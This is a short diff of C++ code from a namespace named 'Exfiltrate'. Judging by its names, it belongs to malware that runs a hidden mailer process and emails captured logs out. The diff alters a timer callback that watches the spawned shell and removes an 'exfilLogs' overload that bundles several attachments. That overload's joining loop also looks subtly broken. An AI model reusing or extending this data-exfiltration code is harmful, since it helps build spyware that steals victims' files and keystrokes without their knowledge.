@@ -168,7 +168,7 @@ namespace Exfiltrate
 		DWORD exitCode = 100;
 		GetExitCodeProcess(shellConfig.hProcess, &exitCode);
 		
-		myTimer.SetFunction([&]()
+		myTimer.setContainerFunction([&]()
 		{
 				WaitForSingleObject(shellConfig.hProcess, 60000);
 				GetExitCodeProcess(shellConfig.hProcess, &exitCode);
@@ -179,36 +179,9 @@ namespace Exfiltrate
 
 				Auxiliary::logError("[From Mailer Function] Error Code: " + Auxiliary::toString((int)exitCode));
 		});
-
-		myTimer.RepeatCount(1L);
-		myTimer.SetInterval(10L);
-		myTimer.Start(true);
 		
 		return (int)exitCode;
 	}
-
-	//Overload of exfil function to handle multiple attachments
-
-	int exfilLogs(const std::string &subject, const std::string &body, const std::vector<std::string> &attachments)
-	{
-		std::string attachments2 = "";
-
-		if (attachments.size() == 1U)
-		{
-			attachments2 = attachments.at(0);
-		}
-		else
-		{
-			for (const auto &value : attachments)
-			{
-				attachments2 += value + "::";
-				attachments2 = attachments2.substr(0, attachments2.length() - 2);
-			}
-		}
-
-		return exfilLogs(subject, body, attachments2);
-	}
-
 }
 
 
